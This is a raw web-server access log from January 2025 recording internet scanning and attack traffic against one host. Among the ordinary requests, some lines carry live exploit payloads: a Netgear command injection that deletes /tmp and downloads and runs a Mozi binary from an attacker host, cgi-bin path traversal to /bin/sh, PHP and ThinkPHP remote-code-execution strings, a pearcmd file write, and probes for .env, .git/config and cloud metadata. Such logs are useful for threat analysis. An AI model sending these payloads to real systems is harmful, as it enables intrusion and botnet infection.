95.214.55.226 - - [16/Jan/2025:17:01:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
170.64.159.7 - - [16/Jan/2025:17:01:35 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
170.64.159.7 - - [16/Jan/2025:17:02:26 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:17:24:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:17:24:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.206.147.216 - - [16/Jan/2025:17:37:30 +0000] "MGLNDD_34.94.250.181_80\n" 400 526 "-" "-"
167.94.145.111 - - [16/Jan/2025:17:55:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.111 - - [16/Jan/2025:17:55:12 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [16/Jan/2025:17:55:12 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [16/Jan/2025:17:55:14 +0000] "GET / HTTP/1.1" 200 966 "http://181.250.94.34.bc.googleusercontent.com/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.111 - - [16/Jan/2025:17:55:15 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
103.233.123.233 - - [16/Jan/2025:18:01:33 +0000] "GET http://metadata.google.internal/computeMetadata/v1/project/ HTTP/1.1" 302 331 "-" "-"
103.233.123.233 - - [16/Jan/2025:18:01:33 +0000] "GET http://169.254.169.254/computeMetadata/v1/project/ HTTP/1.1" 302 331 "-" "-"
195.3.223.40 - - [16/Jan/2025:18:37:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "\x16\x03\x01" 400 526 "-" "-"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "\x16\x03\x01" 400 526 "-" "-"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:40 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [16/Jan/2025:18:39:41 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
80.82.77.202 - - [16/Jan/2025:19:06:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
205.210.31.32 - - [16/Jan/2025:19:28:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.148.10.242 - - [16/Jan/2025:19:30:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.240.127.158 - - [16/Jan/2025:19:36:57 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
78.153.140.93 - - [16/Jan/2025:19:41:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:19:41:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.207.51.58 - - [16/Jan/2025:19:56:15 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.207.32.8 - - [16/Jan/2025:19:56:15 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.207.57.169 - - [16/Jan/2025:19:56:16 +0000] "\x16\x03\x01" 400 526 "-" "-"
80.82.77.202 - - [16/Jan/2025:20:05:16 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
172.169.5.242 - - [16/Jan/2025:20:11:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
49.0.65.53 - - [16/Jan/2025:20:17:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
14.182.220.219 - - [16/Jan/2025:20:35:49 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://14.182.220.219:60585/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
95.214.55.226 - - [16/Jan/2025:20:41:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [16/Jan/2025:20:50:21 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
3.134.109.31 - - [16/Jan/2025:20:51:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.134.109.31 - - [16/Jan/2025:20:51:56 +0000] "\x16\x03\x01" 400 526 "-" "-"
18.216.4.246 - - [16/Jan/2025:20:55:27 +0000] "\x16\x03\x01" 400 526 "-" "-"
18.216.4.246 - - [16/Jan/2025:20:56:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:20:57:16 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [16/Jan/2025:21:11:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:21:11:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
130.61.239.224 - - [16/Jan/2025:21:13:38 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:39 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:41 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:42 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:42 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:43 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:44 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:45 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:46 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:46 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:47 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:48 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:48 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:49 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:49 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:50 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:50 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:51 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:52 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:52 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:53 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:54 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:54 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:55 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:55 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:56 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:56 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:57 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:57 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:58 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:59 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:59 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:00 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:00 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:01 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:02 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:02 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:03 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:03 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:04 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:05 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:05 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:06 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:07 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:07 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
179.43.191.146 - - [16/Jan/2025:21:21:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.143 - - [16/Jan/2025:21:30:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.235.24.237 - - [16/Jan/2025:21:31:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
46.19.138.234 - - [16/Jan/2025:22:08:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
142.93.221.56 - - [16/Jan/2025:22:15:59 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0"
78.153.140.93 - - [16/Jan/2025:22:26:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:22:26:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
103.207.125.222 - - [16/Jan/2025:22:41:09 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 387 "-" "Hello, World"
78.153.140.93 - - [16/Jan/2025:23:13:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:23:13:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.10 - - [16/Jan/2025:23:20:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
87.120.115.119 - - [16/Jan/2025:23:34:39 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; CLT-AL00 Build/HUAWEICLT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044807 Mobile Safari/537.36 MMWEBID/9069 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
172.105.128.12 - - [16/Jan/2025:23:52:17 +0000] "\x16\x03\x01" 400 526 "-" "-"
67.80.239.203 - - [15/Jan/2025:01:30:20 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [15/Jan/2025:01:33:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [15/Jan/2025:01:55:51 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:02:01:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.133 - - [15/Jan/2025:02:08:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.156.129.135 - - [15/Jan/2025:02:13:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
178.128.213.245 - - [15/Jan/2025:02:20:41 +0000] "GET / HTTP/1.1" 400 526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
5.181.190.248 - - [15/Jan/2025:02:23:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:02:23:52 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
87.120.120.18 - - [15/Jan/2025:02:30:07 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Lenovo A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
78.153.140.149 - - [15/Jan/2025:02:32:01 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:02:32:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:39:33 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:39:33 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:03:15:19 +0000] "\x16\x03\x01\x05\xa8\x01" 400 526 "-" "-"
112.165.238.171 - - [15/Jan/2025:03:41:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [15/Jan/2025:03:58:42 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
142.93.165.179 - - [15/Jan/2025:04:16:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
142.93.165.179 - - [15/Jan/2025:04:16:33 +0000] "GET /odinhttpcall1736914593 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
142.93.165.179 - - [15/Jan/2025:04:16:33 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
142.93.165.179 - - [15/Jan/2025:04:16:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
142.93.165.179 - - [15/Jan/2025:04:16:33 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
142.93.165.179 - - [15/Jan/2025:04:16:34 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
142.93.165.179 - - [15/Jan/2025:04:16:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
142.93.165.179 - - [15/Jan/2025:04:16:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.99.128.58 - - [15/Jan/2025:04:16:35 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.243.121 - - [15/Jan/2025:04:16:35 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.245.13 - - [15/Jan/2025:04:16:35 +0000] "GET /v2/_catalog HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
161.35.196.204 - - [15/Jan/2025:04:16:35 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.243.121 - - [15/Jan/2025:04:16:35 +0000] "\x16\x03\x01" 400 526 "-" "-"
134.209.234.70 - - [15/Jan/2025:04:16:35 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
167.99.250.59 - - [15/Jan/2025:04:16:35 +0000] "\x16\x03\x01\x01$\x01" 400 526 "-" "-"
167.99.128.58 - - [15/Jan/2025:04:16:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
167.99.243.121 - - [15/Jan/2025:04:16:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
167.99.245.13 - - [15/Jan/2025:04:16:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/v2/_catalog" "Go-http-client/1.1"
167.99.243.121 - - [15/Jan/2025:04:16:35 +0000] "\x16\x03\x01" 400 526 "-" "-"
161.35.196.204 - - [15/Jan/2025:04:16:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/solr/admin/info/system" "Go-http-client/1.1"
161.35.196.204 - - [15/Jan/2025:04:16:35 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
128.199.141.17 - - [15/Jan/2025:04:16:35 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
161.35.196.204 - - [15/Jan/2025:04:16:36 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
128.199.141.17 - - [15/Jan/2025:04:16:36 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/favicon.ico" "Go-http-client/1.1"
45.156.128.62 - - [15/Jan/2025:04:16:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
::1 - - [15/Jan/2025:04:16:43 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
205.210.31.31 - - [15/Jan/2025:04:24:50 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.31 - - [15/Jan/2025:04:24:50 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.55.226 - - [15/Jan/2025:04:32:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [15/Jan/2025:04:47:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
